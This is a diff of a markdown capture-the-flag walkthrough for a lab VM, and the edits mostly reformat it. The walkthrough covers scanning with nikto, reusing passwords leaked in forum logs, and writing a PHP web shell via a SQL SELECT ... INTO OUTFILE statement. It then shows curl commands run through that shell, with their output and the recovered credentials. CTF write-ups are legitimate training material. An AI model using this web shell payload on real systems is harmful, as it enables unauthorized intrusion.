@@ -27,29 +27,32 @@ On http there is site, which is pretty empty, I check it html source code and th
 After that I scanned it with **skipfish -o path_to_save http://192.168.56.102** and **nikto -h http://192.168.56.102**, and not found thomething interesting.
 
 There is another open port which could be scanned, it's https.
-using * nikto -h https://192.168.56.102 * we recieve few interesting dirs: forum, webmail, phpmyadmin
+using **nikto -h https://192.168.56.102** we recieve few interesting dirs: **forum, webmail, phpmyadmin**
 
-On forum there are 4 topics and only one is iteresting, topic *Probleme login* where user *lmezard* push logs with attempts to log in.
+On forum there are 4 topics and only one is iteresting, topic **Probleme login** where user **lmezard** push logs with attempts to log in.
 
-In these logs we can see, what username lmezard used trying to log in, it's *Failed password for invalid user 'username'* 
-And there is interesting username in string * Failed password for invalid user !q\]Ej?*5K5cy*AJ *
+In these logs we can see, what username lmezard used trying to log in, it's **Failed password for invalid user 'username'** 
+And there is interesting username in string **Failed password for invalid user !q\]Ej?\*5K5cy\*AJ**
 And, these characters came up for lmezard password.
 
-In lmezard profile we could see his email, so we go to webmail, and try the same password !q\]Ej?*5K5cy*AJ to his mail. And it's fits again.
+In lmezard profile we could see his email, so we go to webmail, and try the same password **!q\]Ej?\*5K5cy\*AJ** to his mail. And it's fits again.
 
-In mail there is message * DB Access * which contains * Use root/Fg-'kKXBj87E:aJ$  *. It doesn't fit to ssh and ftp connection, but it's fit to phpmyadmin.
+In mail there is message **DB Access** which contains **Use root/Fg-'kKXBj87E:aJ$ .** It doesn't fit to ssh and ftp connection, but it's fit to phpmyadmin.
 
 First of all I checked all tables in db, but all users passwords hashed and I didn't find any helpful information.
 And another way to get access to server - is SQL injection through which you can access the shell.
-(detailed articles about SQL injections https://null-byte.wonderhowto.com/how-to/use-sql-injection-run-os-commands-get-shell-0191405/ https://www.informit.com/articles/article.aspx?p=1407358&seqNum=2)
+**(detailed articles about SQL injections https://null-byte.wonderhowto.com/how-to/use-sql-injection-run-os-commands-get-shell-0191405/ https://www.informit.com/articles/article.aspx?p=1407358&seqNum=2)**
 
+```
 * SELECT  '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/forum/templates_c/hack.php' *
-templates_c - dir which always need write permission, used for compiled templates. I found it through *dirbuster* and brute force dirs to write access.
+```
+templates_c - dir which always need write permission, used for compiled templates. I found it through **dirbuster** and brute force dirs to write access.
 
-After that we can run something like this * https://192.168.56.102/forum/templates_c/hack.php?cmd=pwd * and it will show pwd output * /var/www/forum/templates_c *
+After that we can run something like this **https://192.168.56.102/forum/templates_c/hack.php?cmd=pwd** and it will show pwd output **/var/www/forum/templates_c **
 
-After a little research, we can see LOOKATME dir in home dir with other users (I used curl because more convenient output):
-* curl --insecure 'https://192.168.56.102/forum/templates_c/hack.php?cmd=ls%20-la%20/home' * (--insecure because of https not safe)
+After a little research, we can see LOOKATME dir in home dir with other users (I used curl because of more convenient output):
+```
+curl --insecure 'https://192.168.56.102/forum/templates_c/hack.php?cmd=ls%20-la%20/home' (--insecure because of https not safe)
 drwxrwx--x 9 www-data             root                 126 Oct 13  2015 .
 drwxr-xr-x 1 root                 root                 200 Apr 16 04:01 ..
 drwxr-x--- 2 www-data             www-data              31 Oct  8  2015 LOOKATME
@@ -59,8 +62,9 @@ drwxr-x--- 4 laurie@borntosec.net laurie@borntosec.net 113 Oct 15  2015 laurie@b
 dr-xr-x--- 2 lmezard              lmezard               61 Oct 15  2015 lmezard
 drwxr-x--- 3 thor                 thor                 129 Oct 15  2015 thor
 drwxr-x--- 4 zaz                  zaz                  147 Oct 15  2015 zaz
+```
 
-There is file password in LOOKATME dir, which contains * lmezard:G!@M6f4Eatau{sF" *
+There is file password in LOOKATME dir, which contains **lmezard:G!@M6f4Eatau{sF"**
 
 This password fit to ftp port, which contains README file - "Complete this little challenge and use the result as password for user 'laurie' to login in ssh", and fun file (which need to be solved).
 (command 'get' to receive files through ftp)
